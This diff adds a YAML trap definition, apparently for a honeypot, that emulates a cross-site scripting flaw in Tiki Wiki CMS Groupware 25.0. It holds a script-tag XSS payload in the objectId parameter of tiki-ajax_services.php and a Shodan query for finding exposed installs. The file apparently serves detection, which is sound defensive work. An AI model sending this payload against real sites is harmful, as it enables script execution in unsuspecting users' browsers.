@@ -1,0 +1,35 @@
+id: tikiwiki-xss
+info:
+  name: Tiki Wiki CMS Groupware v25.0 - Cross Site Scripting
+  author: arafatansari
+  description: 'Tiki Wiki CMS Groupware version 25.0 suffers from a cross site scripting
+    vulnerability.
+
+    '
+  severity: medium
+  reference:
+  - https://packetstormsecurity.com/files/170446/Tiki-Wiki-CMS-Groupware-25.0-Cross-Site-Scripting.html
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: http.html:"tiki wiki"
+  tags: edb,xss,tikiwiki,packetstorm,acketstorm
+traps:
+- request:
+    method: GET
+    path: /tiki/tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(document.domain)</script>
+    headers: null
+    body: null
+  response:
+    status_code: 403
+    headers: {}
+    body: <script>alert(document.domain)</script>Tiki Wiki CMS
+- request:
+    method: GET
+    path: /tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(document.domain)</script>
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
